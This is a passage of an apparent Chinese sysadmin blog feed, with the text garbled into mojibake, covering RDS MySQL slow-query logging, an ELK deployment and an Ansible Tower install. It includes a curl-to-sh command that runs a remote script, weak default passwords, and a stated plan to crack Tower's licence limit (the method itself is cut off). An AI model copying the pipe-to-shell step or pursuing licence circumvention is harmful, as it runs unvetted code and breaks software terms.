      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>mysqlæ•°æ®åº“å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—å’ŒæŸ¥è¯¢ä¸­æ²¡ç´¢å¼•çš„è¯­å¥ã€‚ä¾›åˆ†æ</p></blockquote><a id="more"></a><h1 id="0x00å‚æ•°"><a href="#0x00å‚æ•°" class="headerlink" title="0x00å‚æ•°"></a>0x00å‚æ•°</h1><p>é¦–å…ˆé€‰æ‹©<code>RDSæœåŠ¡</code>&gt;<code>å‚æ•°ç»„</code>é€‰æ‹©éœ€è¦æ›´æ”¹çš„å‚æ•°ç»„æ›´æ”¹å¦‚ä¸‹å‚æ•°:</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></div><div class="code"><pre><div class="line">- slow_query_logï¼šè¦åˆ›å»ºæ…¢é€ŸæŸ¥è¯¢æ—¥å¿—ï¼Œè¯·è®¾ç½®ä¸º 1ã€‚é»˜è®¤å€¼ä¸º 0ã€‚</div><div class="line"></div><div class="line">- general_logï¼šè¦åˆ›å»ºä¸€èˆ¬æ—¥å¿—ï¼Œè¯·è®¾ç½®ä¸º 1ã€‚é»˜è®¤å€¼ä¸º 0ã€‚</div><div class="line"></div><div class="line">- long_query_timeï¼šåªè®°å½•æŸ¥è¯¢æ—¶é—´è¶…è¿‡åˆ¶å®šæ—¶é—´çš„sqlã€‚ä¾‹long_query_time=0.5åªè®°å½•æŸ¥è¯¢æ—¶é—´è¶…è¿‡500æ¯«ç§’çš„sqlã€‚</div><div class="line"></div><div class="line">- log_queries_not_using_indexesï¼šè¦å°†æ‰€æœ‰ä¸ä½¿ç”¨ç´¢å¼•çš„æŸ¥è¯¢è®°å½•åˆ°æ…¢é€ŸæŸ¥è¯¢æ—¥å¿—ï¼Œè¯·è®¾ç½®ä¸º 1ã€‚é»˜è®¤å€¼ä¸º 0ã€‚å³ä½¿æŸ¥è¯¢çš„æ‰§è¡Œæ—¶é—´å°äº long_query_time å‚æ•°å€¼ï¼Œåªè¦å®ƒä»¬ä¸ä½¿ç”¨ç´¢å¼•ï¼Œå°±ä¼šè¢«ç³»ç»Ÿè®°å½•ã€‚</div><div class="line"></div><div class="line">- log_outputï¼šæ‚¨å¯ä¸º log_output å‚æ•°æŒ‡å®šä¸‹åˆ—é€‰é¡¹ä¹‹ä¸€ã€‚</div><div class="line">TABLE (é»˜è®¤) â€“ å°†ä¸€èˆ¬æŸ¥è¯¢å†™å…¥ mysql.general_log è¡¨ï¼Œå°†æ…¢é€ŸæŸ¥è¯¢å†™å…¥ mysql.slow_log è¡¨ã€‚</div><div class="line">FILE  (æ¨è) â€“ å°†ä¸€èˆ¬æŸ¥è¯¢æ—¥å¿—å’Œæ…¢é€ŸæŸ¥è¯¢æ—¥å¿—å†™å…¥æ–‡ä»¶ç³»ç»Ÿã€‚æ—¥å¿—æ–‡ä»¶æ¯å°æ—¶è½®æ¢ä¸€æ¬¡ã€‚</div><div class="line">NONEâ€“ ç¦ç”¨æ—¥å¿—è®°å½•ã€‚</div></pre></div></div></figure><p>å¯ç”¨äº†æ—¥å¿—è®°å½•æ—¶ï¼ŒAmazon RDS ä¼šå®šæœŸè½®æ¢è¡¨æ—¥å¿—æˆ–åˆ é™¤æ—¥å¿—æ–‡ä»¶ï¼Œlog_outputä¸ºTABLEæ—¶å¦‚éœ€æ‰‹åŠ¨è½®æ¢æ‰§è¡Œï¼š</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">PROMPT&gt; CALL mysql.rds_rotate_slow_log;</div><div class="line">PROMPT&gt; CALL mysql.rds_rotate_general_log;</div></pre></div></div></figure><p><code>log_output</code>ä¸º<code>FILE</code>æ—¶ä¼šæ¯å°æ—¶æ£€æŸ¥æ—¥å¿—æ–‡ä»¶å¹¶åˆ é™¤ 24 å°æ—¶ä¹‹å‰çš„æ—¥å¿—æ–‡ä»¶ã€‚</p><h1 id="0x01å®é™…åº”ç”¨å‚æ•°"><a href="#0x01å®é™…åº”ç”¨å‚æ•°" class="headerlink" title="0x01å®é™…åº”ç”¨å‚æ•°"></a>0x01å®é™…åº”ç”¨å‚æ•°</h1><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">slow_query_log=1</div><div class="line">general_log=1</div><div class="line">long_query_time=0.5</div><div class="line">log_queries_not_using_indexes=1</div><div class="line">log_output=FILE</div></pre></div></div></figure>]]></content>
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>log4j-1.2 + ELKéƒ¨ç½²</title>
      <link href="/2017/09/18/elk-deploy/"/>
      <url>/2017/09/18/elk-deploy/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p><img src="https://kionf.com/article_images/kibana-dash.png" alt="kionf"></p><p>log4j-1.2 + logstash-5.0.1 + elasticsearch-5.6.0 + kibana-5.6.0</p></blockquote><a id="more"></a><h1 id="0x00-ä¸‹è½½ELK"><a href="#0x00-ä¸‹è½½ELK" class="headerlink" title="0x00 ä¸‹è½½ELK"></a>0x00 ä¸‹è½½ELK</h1><p>ä¸‹è½½ ï¼š</p><p>1) <a href="https://artifacts.elastic.co/downloads/logstash/logstash-5.0.1.tar.gz" title="logstash" target="_blank" rel="noopener">logstash-5.0.1</a><br>2) <a href="https://artifacts.elastic.co/downloads/kibana/kibana-5.6.0-linux-x86_64.tar.gz" title="kibana" target="_blank" rel="noopener">kibana-5.6.0</a><br>3) <a href="https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.6.0.tar.gz" title="elasticsearch-5.6.0" target="_blank" rel="noopener">elasticsearch-5.6.0</a><br>4) <a href="http://mirrors.linuxeye.com/jdk/jdk-8u112-linux-x64.tar.gz" title="jdk1.8" target="_blank" rel="noopener">å®‰è£…jdk1.8</a> <code>curl https://raw.githubusercontent.com/kalivim/Linux_shell/master/jdk-1.8.112.sh|sh</code></p><p>ä¸‹è½½å®Œæˆåè§£å‹ç›¸åº”æ–‡ä»¶,è„šæœ¬å®‰è£…jdkåœ¨/data/software/ä¸‹</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">export JAVA_HOME=/data/jdk1.8.0_112</div><div class="line">export PATH=$JAVA_HOME/bin:$PATH</div><div class="line">export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</div></pre></div></div></figure><h1 id="0x01-é…ç½®log4j"><a href="#0x01-é…ç½®log4j" class="headerlink" title="0x01 é…ç½®log4j"></a>0x01 é…ç½®log4j</h1><p>é¦–å…ˆé…ç½®ç¨‹åºlog4jé…ç½®æ–‡ä»¶<code>log4j.properties</code>,æ·»åŠ å¦‚ä¸‹é…ç½®</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></div><div class="code"><pre><div class="line">#åœ¨rootLoggerä¸­æ·»åŠ logstash</div><div class="line">log4j.rootLogger=info,all,logstash</div><div class="line"></div><div class="line">#logstach</div><div class="line">log4j.appender.logstash=org.apache.log4j.net.SocketAppender</div><div class="line">#logstashç›‘å¬ç«¯å£ï¼Œé»˜è®¤4560</div><div class="line">log4j.appender.logstash.Port=4560</div><div class="line">#logstashä¸»æœºip/host</div><div class="line">log4j.appender.logstash.RemoteHost=ops</div><div class="line">log4j.appender.logstash.ReconnectionDelay=60000</div><div class="line">log4j.appender.logstash.LocationInfo=true</div></pre></div></div></figure><h1 id="0x02-é…ç½®logstash"><a href="#0x02-é…ç½®logstash" class="headerlink" title="0x02 é…ç½®logstash"></a>0x02 é…ç½®logstash</h1><p>ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼Œlog4j.cfg</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></div><div class="code"><pre><div class="line">vim logstash-5.0.1/log4j.cfg</div><div class="line"></div><div class="line">#å†…å®¹</div><div class="line"></div><div class="line">input &#123;</div><div class="line">log4j &#123;</div><div class="line">host =&gt; &quot;172.16.0.12&quot;</div><div class="line">#ç›‘å¬åœ°å€</div><div class="line">port =&gt; 4560</div><div class="line">#ç›‘å¬ç«¯å£</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">filter &#123;</div><div class="line">#è¿‡æ»¤é”™è¯¯ç±»å‹åˆ é™¤æ‰INFOç±»å‹é”™è¯¯</div><div class="line">if [priority] == &quot;INFO&quot; &#123;</div><div class="line">drop &#123;&#125;</div><div class="line">&#125; #else if [method] == &quot;checkSqlShardName&quot; &#123;</div><div class="line">#drop &#123;&#125;</div><div class="line">#&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">output &#123;</div><div class="line">#è¾“å‡ºåˆ°æ§åˆ¶å°ï¼ˆè°ƒè¯•ï¼‰</div><div class="line">stdout &#123;</div><div class="line">codec =&gt; rubydebug</div><div class="line">&#125;</div><div class="line"></div><div class="line">elasticsearch &#123;</div><div class="line">hosts =&gt; [&quot;127.0.0.1:9200&quot;]</div><div class="line">#elasticsearchåœ°å€</div><div class="line">index =&gt; &quot;game-%&#123;+YYYY.MM.dd&#125;&quot;</div><div class="line">#å»ºç«‹ç´¢å¼•</div><div class="line">flush_size =&gt; 1000</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></div></div></figure><div class="note danger"><p><strong>æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªå°bug,åœ¨<code>input</code>ä¸­ä½¿ç”¨<code>log4j</code>æ¥æ”¶ä¸åˆ°æ—¥å¿—ï¼Œä½¿ç”¨<code>tcp</code>å¯ä»¥æ¥æ”¶ã€‚è¿™é‡Œéœ€è¦æ”¹ä¸‹logstashæºç æ–‡ä»¶</strong></p><p><code>vim logstash-core/lib/jars.rb</code></p><p>æ³¨é‡Šæ‰ç¬¬äºŒè¡Œ<code>#require_jar(&#39;org.apache.logging.log4j&#39;, &#39;log4j-1.2-api&#39;, &#39;2.6.2&#39;)</code></p></div><p><strong>æ³¨ ï¼š</strong>å¯ä»¥æŠŠ<code>output</code>ä¸­çš„<code>elasticsearch</code>ï¼Œæ³¨é‡Šæ‰ï¼Œå¯åŠ¨javaç¨‹åºæµ‹è¯•ä¸‹logstashæ§åˆ¶å°ä¸­æ˜¯å¦è¾“å‡ºæ—¥å¿—ï¼Œè°ƒè¯•å¯åŠ¨<code>./bin/logstash -f log4j.cfg</code></p><h1 id="0x03-é…ç½®elasticsearch"><a href="#0x03-é…ç½®elasticsearch" class="headerlink" title="0x03 é…ç½®elasticsearch"></a>0x03 é…ç½®elasticsearch</h1><p>rootç›´æ¥å¯åŠ¨ elasticsearch æŠ¥é”™å¦‚ä¸‹</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></div><div class="code"><pre><div class="line">[2017-09-18T08:51:35,959][WARN ][o.e.b.ElasticsearchUncaughtExceptionHandler] [] uncaught exception in thread [main]</div><div class="line">org.elasticsearch.bootstrap.StartupException: java.lang.RuntimeException: can not run elasticsearch as root</div><div class="line">at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:136) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">at org.elasticsearch.bootstrap.Elasticsearch.execute(Elasticsearch.java:123) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:67) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:134) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">at org.elasticsearch.cli.Command.main(Command.java:90) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:91) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:84) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">Caused by: java.lang.RuntimeException: can not run elasticsearch as root</div><div class="line">at org.elasticsearch.bootstrap.Bootstrap.initializeNatives(Bootstrap.java:106) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">at org.elasticsearch.bootstrap.Bootstrap.setup(Bootstrap.java:195) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">at org.elasticsearch.bootstrap.Bootstrap.init(Bootstrap.java:342) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:132) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">... 6 more</div></pre></div></div></figure><p>elasticsearchä¸å…è®¸rootç”¨æˆ·è¿è¡Œï¼Œé¦–å…ˆåˆ›å»ºæ™®é€šç”¨æˆ·ï¼Œè®¾ç½®æƒé™</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">useradd elk</div><div class="line"></div><div class="line">chown -R elk:elk ./elasticsearch-5.6.0</div></pre></div></div></figure><blockquote><p>é…ç½®æ–‡ä»¶<code>config/elasticsearch.yml</code>ç¬¬55è¡Œå’Œ59è¡Œæ˜¯ç›‘å¬åœ°å€å’Œç«¯å£ï¼Œ<code>config/jvm.options</code>jvmå†…å­˜é…ç½®æ–‡ä»¶ï¼Œæ ¹æ®éœ€æ±‚é…ç½®</p></blockquote><p>åˆ‡æ¢åˆ°æ™®é€šç”¨æˆ·elkå¯åŠ¨elasticsearch</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">su - elk</div><div class="line">cd /data/elk/elasticsearch-5.6.0</div><div class="line">./bin/elasticsearch -d</div><div class="line">#-dé€‰é¡¹åå°è¿è¡Œ</div></pre></div></div></figure><h1 id="0x04-é…ç½®nginxåŠ å›ºkibanaå®‰å…¨"><a href="#0x04-é…ç½®nginxåŠ å›ºkibanaå®‰å…¨" class="headerlink" title="0x04 é…ç½®nginxåŠ å›ºkibanaå®‰å…¨"></a>0x04 é…ç½®nginxåŠ å›ºkibanaå®‰å…¨</h1><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></div><div class="code"><pre><div class="line"></div><div class="line">server &#123;</div><div class="line">listen8000;</div><div class="line">server_namelocalhost;</div><div class="line">auth_basic&quot;ELK Log Auth&quot;;</div><div class="line">#å¯†ç æ–‡ä»¶</div><div class="line">auth_basic_user_file /data/nginx/kibana.passwd;</div><div class="line"></div><div class="line">#é…ç½®ssl</div><div class="line">sslon;</div><div class="line">ssl_certificate/data/nginx/all.crt;</div><div class="line">ssl_certificate_key/data/nginx/server.key;</div><div class="line"></div><div class="line"></div><div class="line">location / &#123;</div><div class="line">proxy_pass http://127.0.0.1:5601;</div><div class="line">proxy_redirect off;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></div></div></figure><h2 id="1-ç”Ÿæˆnginxè®¤è¯æ–‡ä»¶"><a href="#1-ç”Ÿæˆnginxè®¤è¯æ–‡ä»¶" class="headerlink" title="1. ç”Ÿæˆnginxè®¤è¯æ–‡ä»¶"></a>1. ç”Ÿæˆnginxè®¤è¯æ–‡ä»¶</h2><p>å¦‚æœæç¤ºæ²¡ç”¨htpasswdå°±è£…ä¸ªapache,æ ¹æ®æç¤ºè¾“å…¥ä¸¤æ¬¡å¯†ç å°±ok</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">htpasswd  -c /data/nginx/kibana.passwd username</div><div class="line">#&gt; New password: </div><div class="line">#&gt; Re-type new password: </div><div class="line">#&gt; Adding password for user username</div></pre></div></div></figure><h2 id="2-ç”Ÿæˆsslè¯ä¹¦"><a href="#2-ç”Ÿæˆsslè¯ä¹¦" class="headerlink" title="2. ç”Ÿæˆsslè¯ä¹¦"></a>2. ç”Ÿæˆsslè¯ä¹¦</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">openssl genrsa -des3 -out server.key 1024</div><div class="line">openssl rsa -in server.key -out server1.key</div><div class="line">openssl req -new -key server1.key -out all.csr</div><div class="line">#ä¼šæç¤ºè®©è¾“å…¥å„ç§ä¿¡æ¯ï¼Œæœ€åä¼šè®©è¾“å…¥å¯†ç ï¼Œå¦‚æœè®¾ç½®å¯åŠ¨nginxä¼šè®©è¾“å…¥å¯†ç ã€‚</div><div class="line">openssl x509 -req -days 365 -in all.csr -signkey server1.key -out all.crt</div></pre></div></div></figure><h2 id="3-å¯åŠ¨nginx"><a href="#3-å¯åŠ¨nginx" class="headerlink" title="3. å¯åŠ¨nginx"></a>3. å¯åŠ¨nginx</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">./sbin/nginx</div></pre></div></div></figure><h1 id="0x05-å¯åŠ¨elk"><a href="#0x05-å¯åŠ¨elk" class="headerlink" title="0x05 å¯åŠ¨elk"></a>0x05 å¯åŠ¨elk</h1><p>ä½¿ç”¨<code>screen</code> å¯åŠ¨kibanaã€logstash</p><p>å¯åŠ¨logstashï¼š</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></div><div class="code"><pre><div class="line">#åˆ›å»ºåä¸ºlogstashçš„screenåå°è¿›ç¨‹</div><div class="line">screen -dmS logstash</div><div class="line"></div><div class="line">#æŸ¥çœ‹screenè¿›ç¨‹</div><div class="line">screen -ls</div><div class="line">There are screens on:</div><div class="line">19654.logstash(Detached)</div><div class="line"></div><div class="line">#è¿›å…¥ä¼šè¯</div><div class="line">screen -r logstash</div><div class="line"></div><div class="line">#å¯åŠ¨logstash</div><div class="line">cd /data/elk/logstash-5.0.1</div><div class="line">./bin/logstash -f log4j.cfg</div><div class="line"></div><div class="line">#åå°è¿è¡Œ</div><div class="line">Ctrl + a  d</div></pre></div></div></figure><p>å¯åŠ¨kibanaï¼š</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">screen -dmS kibana</div><div class="line">screen -r kibana</div><div class="line">cd /data/elk/kibana-5.6.0-linux-x86_64</div><div class="line">./bin/kibana</div><div class="line">Ctrl + a + d</div></pre></div></div></figure><p>kibanaæ·»åŠ ç´¢å¼•<code>game-</code>ï¼ˆåœ¨logstashé…ç½®æ–‡ä»¶ä¸­ï¼‰</p><p><img src="https://kionf.com/article_images/kibana-add.png" alt="kionf"></p><p>è‡ªå®šä¹‰Visualizeï¼Œæ˜¾ç¤ºåˆ°dashboard</p><p><img src="https://kionf.com/article_images/kibana-dash.png" alt="kionf"></p><h1 id="0x06-è¿™åªæ˜¯å¼€å§‹ã€‚ã€‚ã€‚ã€‚"><a href="#0x06-è¿™åªæ˜¯å¼€å§‹ã€‚ã€‚ã€‚ã€‚" class="headerlink" title="0x06 è¿™åªæ˜¯å¼€å§‹ã€‚ã€‚ã€‚ã€‚"></a>0x06 è¿™åªæ˜¯å¼€å§‹ã€‚ã€‚ã€‚ã€‚</h1><p><a href="https://kibana.logstash.es/content/" title="è¿›é—¨" target="_blank" rel="noopener">è¿›é—¨</a><br><a href="https://www.elastic.co/guide/index.html" title="æ‘¸çˆ¬æ»šæ‰“" target="_blank" rel="noopener">æ‘¸çˆ¬æ»šæ‰“</a></p>]]></content>
      
      <categories>
          
          <category> è‡ªåŠ¨åŒ–è¿ç»´ </category>
          
          <category> ELK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ELK </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Ansible-Toweréƒ¨ç½²andç ´è§£</title>
      <link href="/2017/07/24/linux-tower/"/>
      <url>/2017/07/24/linux-tower/</url>
      <content type="html"><![CDATA[<p><img src="https://kionf.com/article_images/tower/tower-dashboard.png" alt="kionf"></p><blockquote class="blockquote-center"><p><code>ansibke-tower</code>ä»–æ˜¯ä¸€ä¸ªå›¾å½¢åŒ–çš„ä»»åŠ¡è°ƒåº¦ï¼Œå¤æ‚æœåŠ¡éƒ¨ç½²ï¼ŒITè‡ªåŠ¨åŒ–çš„ä¸€ä¸ªç®¡ç†å¹³å°ã€‚å¯ä»¥é€šè¿‡ç•Œé¢ä»githubæ‹‰å–æœ€æ–°playbookå®æ–½æœåŠ¡éƒ¨ç½²ï¼Œæé«˜ç”Ÿäº§æ•ˆç‡ã€‚å½“ç„¶ï¼Œå®ƒä¹Ÿæä¾›ä¸€ä¸ªRESET APIå’Œå‘½ä»¤è¡Œçš„CLIä»¥ä¾›pythonè„šæœ¬è°ƒç”¨ã€‚</p></blockquote><a id="more"></a><h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p><a href="https://www.ansible.com/tower" title="ansible-tower" target="_blank" rel="noopener">ansible-tower</a>å…³äºæ­¤ç±»çš„æ–‡ç« æ¯”è¾ƒå°‘ï¼Œè¸©è¿‡å‘ï¼Œ16å¹´é‚£ä¼šå„¿æœ‰å¬è¿‡å°±è£…ä¸Šç ”ç©¶äº†ä¸€å‘ï¼Œç°åœ¨åšä¸ªè¿Ÿæ¥çš„ç¬”è®°ï¼Œ åŒ…æ‹¬éƒ¨ç½²ï¼Œå’Œå…è´¹ç‰ˆ10å°æœºå™¨é™åˆ¶çš„ç ´è§£ã€‚</p><div class="note warning"><p>æ”¯æŒçš„æ“ä½œç³»ç»Ÿï¼š</p><ul><li>Red Hat Enterprise Linux 7.2 or later 64-bit</li><li>CentOS 7.2 or later 64-bit</li><li>Ubuntu 14.04 LTS 64-bit</li><li>Ubuntu 16.04 LTS 64-bit</li></ul><p>æ¨èæœ€ä½å†…å­˜ä¸º2GBã€‚</p></div><h1 id="0x01-å®‰è£…"><a href="#0x01-å®‰è£…" class="headerlink" title="0x01 å®‰è£…"></a>0x01 å®‰è£…</h1><p>æ•´ä¸ªç”³è¯·æµç¨‹ä¹Ÿæ˜¯éº»çƒ¦çš„å¾ˆï¼Œå°¤å…¶æ˜¯ç”³è¯·å…è´¹licenseã€‚è¿™é‡Œç›´æ¥ç»™å‡ºå®˜ç½‘ä¸‹è½½é“¾æ¥<a href="http://releases.ansible.com/ansible-tower/setup/" title="Ansible-Tower" target="_blank" rel="noopener">Ansible-Tower</a></p><p>è¿™é‡Œä½¿ç”¨çš„æ˜¯æœ€æ–°ç‰ˆ(3.1.4)</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">wget http://releases.ansible.com/ansible-tower/setup/ansible-tower-setup-latest.tar.gz -P /data/tower/</div><div class="line"></div><div class="line"><span class="built_in">cd</span> /data/tower/</div><div class="line"></div><div class="line">tar xvf ansible-tower-setup-latest.tar.gz -C ./</div><div class="line"></div><div class="line"><span class="built_in">cd</span> ansible-tower-setup-3.1.4/</div></pre></div></div></figure><p>ç›®å½•ç»“æ„ï¼Œå®‰è£…éå¸¸ç®€å•ï¼Œè¿™ä¹Ÿè¦å¾—ç›Šäºansibleçš„playbookã€‚</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></div><div class="code"><pre><div class="line">[root@ad0e6b9ef8d5 ansible-tower-setup-3.1.4]# ll</div><div class="line">total 60</div><div class="line">-rw-r--r--.  1 root root  2526 Jul 10 13:59 README.md</div><div class="line">-rw-r--r--.  1 root root   129 Jul 10 13:59 backup.yml</div><div class="line">drwxr-xr-x.  2 root root  4096 Jul 10 13:59 group_vars</div><div class="line">-rw-r--r--.  1 root root    10 Jul 25 03:03 install.retry</div><div class="line">-rw-r--r--.  1 root root  5571 Jul 10 13:59 install.yml</div><div class="line">-rw-r--r--.  1 root root   379 Jul 25 03:03 inventory</div><div class="line">drwxr-xr-x.  2 root root 12288 Jul 10 13:59 licenses</div><div class="line">-rw-r--r--.  1 root root   944 Jul 10 13:59 restore.yml</div><div class="line">drwxr-xr-x. 18 root root  4096 Jul 10 13:59 roles</div><div class="line">-rwxr-xr-x.  1 root root  9628 Jul 10 13:59 setup.sh</div></pre></div></div></figure><p>ç¼–è¾‘<strong>inventory</strong>é…ç½®æ–‡ä»¶å¦‚ä¸‹</p><p><code>vim inventory</code></p><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></div><div class="code"><pre><div class="line">[tower]</div><div class="line">localhost ansible_connection=local</div><div class="line"></div><div class="line">[database]</div><div class="line"></div><div class="line">[all:vars]</div><div class="line">#ansible-towerç™»å½•å¯†ç </div><div class="line diff-deletion">admin_password='admin'</div><div class="line"></div><div class="line">#PostgreSQLç›‘å¬åœ°å€ç«¯å£</div><div class="line">pg_host='127.0.0.1'</div><div class="line">pg_port='5432'</div><div class="line"></div><div class="line">pg_database='awx'</div><div class="line">pg_username='awx'</div><div class="line">#here</div><div class="line">pg_password='awx'</div><div class="line"></div><div class="line">rabbitmq_port=5672</div><div class="line">rabbitmq_vhost=tower</div><div class="line">rabbitmq_username=tower</div><div class="line">#here</div><div class="line">rabbitmq_password='tower'</div><div class="line">rabbitmq_cookie=cookiemonster</div><div class="line"></div><div class="line"># Needs to be true for fqdns and ip addresses</div><div class="line">rabbitmq_use_long_name=false</div></pre></div></div></figure><p>è¿è¡Œå®‰è£…è„šæœ¬</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">sh setup.sh</div></pre></div></div></figure><p>è„šæœ¬ä¼šè‡ªåŠ¨å®‰è£…ï¼Œç†Ÿæ‚‰çš„æ‰§è¡Œplaybookä»»åŠ¡ç•Œé¢ã€‚</p><p>å®‰è£…æˆåŠŸ</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">localhost                  : ok=41   changed=5    unreachable=0    failed=0</div></pre></div></div></figure><h1 id="0x02å¯¼å…¥licenseæ–‡ä»¶"><a href="#0x02å¯¼å…¥licenseæ–‡ä»¶" class="headerlink" title="0x02å¯¼å…¥licenseæ–‡ä»¶"></a>0x02å¯¼å…¥licenseæ–‡ä»¶</h1><div class="note danger"><p><strong>æ³¨æ„ä»3.2.xç‰ˆæœ¬å¼€å§‹ansible-towerç 